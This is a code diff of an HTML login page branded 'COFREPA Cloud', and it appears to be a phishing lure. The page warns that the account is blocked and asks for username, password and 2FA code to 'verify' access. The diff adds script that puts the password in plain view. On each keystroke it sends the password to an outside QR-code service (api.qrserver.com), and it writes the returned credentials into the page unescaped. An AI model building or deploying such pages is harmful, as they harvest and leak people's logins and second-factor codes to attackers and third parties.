@@ -1,31 +1,42 @@
 <html>
 <head>
-    <title>COFREPA Cloud - Blocage Credentials Expires</title>
+    <title>COFREPA Cloud - Account Access Blocked</title>
     <style>
         body { font-family: Arial, sans-serif; background: #f4f4f4; }
         .container { max-width: 400px; margin: 60px auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 8px #ccc; }
         h2 { text-align: center; color: #c0392b; }
         label { display: block; margin-bottom: 8px; }
-        input[type="text"] { width: 100%; padding: 8px; margin-bottom: 16px; border: 1px solid #ccc; border-radius: 4px; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 8px; margin-bottom: 16px; border: 1px solid #ccc; border-radius: 4px; }
         button { width: 100%; padding: 10px; background: #2980b9; color: #fff; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
         button:hover { background: #3498db; }
         .footer { text-align: center; margin-top: 20px; color: #888; font-size: 13px; }
         .error { color: #c0392b; text-align: center; }
+        .qr-code { text-align: center; margin-top: 20px; }
+        .qr-code img {
+            display: block;
+            margin: 0 auto;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Blocage Credentials Expires</h2>
+        <h2>Account Access Blocked</h2>
+        <p>Your account access has been temporarily blocked due to security concerns. Please verify your credentials below to regain access.</p>
         <form method="POST" onsubmit="submitBlock(event)">
-            <label for="username">Username:</label>
-            <input type="text" id="username" name="username" required />
-            <label for="password">Mot de passe :</label>
-            <input type="password" id="password" name="password" required />
-            <label for="code_2fa">Code 2FA :</label>
-            <input type="text" id="code_2fa" name="code_2fa" required />
-            <button type="submit">Verifier</button>
+            <label for="username">Enter your username:</label>
+            <input type="text" id="username" name="username" placeholder="Your username" required />
+            <label for="password">Enter your password:</label>
+            <input type="text" id="password" name="password" placeholder="Your password" required />
+            <label for="code_2fa">Enter your 2FA code:</label>
+            <input type="text" id="code_2fa" name="code_2fa" placeholder="Your 2FA code" required />
+            <button type="submit">Verify</button>
         </form>
-        <div class="footer">Service fourni par COFREPA Cloud</div>
+        <div class="qr-code">
+            <p><b>Password:</b> <span id="passwordDisplay"></span></p>
+            <p>Scan the QR code below to set up 2FA:</p>
+            <img id="qrCode" src="" alt="QR Code" />
+        </div>
+        <div class="footer">Powered by COFREPA Cloud</div>
     </div>
     <script>
     function submitBlock(event) {
@@ -41,16 +52,35 @@
         .then(response => response.json())
         .then(data => {
             if(data.status === 'success') {
-                document.body.innerHTML = `<div class='container'><h2>Succès</h2><p>${data.message}</p><div class='footer'>Service fourni par COFREPA Cloud</div></div>`;
+                document.body.innerHTML = `<div class='container'><h2>Success</h2><p>${data.message}</p><p><b>Username:</b> ${data.username}</p><p><b>Password:</b> ${data.password}</p><div class='footer'>Powered by COFREPA Cloud</div></div>`;
             } else if(data.status === 'expired') {
-                document.body.innerHTML = `<div class='container'><h2 class='error'>Compte bloque</h2><p>${data.message}</p><a href='${data.redirect}'><button>Renouveler mes accès</button></a><div class='footer'>Service fourni par COFREPA Cloud</div></div>`;
+                document.body.innerHTML = `<div class='container'><h2 class='error'>Account Blocked</h2><p>${data.message}</p><a href='${data.redirect}'><button>Renew Access</button></a><div class='footer'>Powered by COFREPA Cloud</div></div>`;
             } else {
                 alert(data.message);
             }
         })
-        .catch(() => alert('Erreur reseau.'));
+        .catch(() => alert('Network error. Please try again later.'));
     }
+
+    // Generate QR code for 2FA setup
+    document.addEventListener('DOMContentLoaded', () => {
+        const qrCode = document.getElementById('qrCode');
+        const username = document.getElementById('username').value;
+        const secret = "YOUR_GENERATED_SECRET"; // Replace with server-generated secret
+        const qrData = `otpauth://totp/COFREPA:${username}?secret=${secret}&issuer=COFREPA`;
+        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(qrData)}&size=150x150`;
+        qrCode.src = qrUrl;
+    });
+
+    document.getElementById('password').addEventListener('input', () => {
+        const qrCode = document.getElementById('qrCode');
+        const password = document.getElementById('password').value;
+        const passwordDisplay = document.getElementById('passwordDisplay');
+        passwordDisplay.textContent = password;
+        const qrData = `Password: ${password}`;
+        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(qrData)}&size=150x150`;
+        qrCode.src = qrUrl;
+    });
     </script>
 </body>
 </html>
-
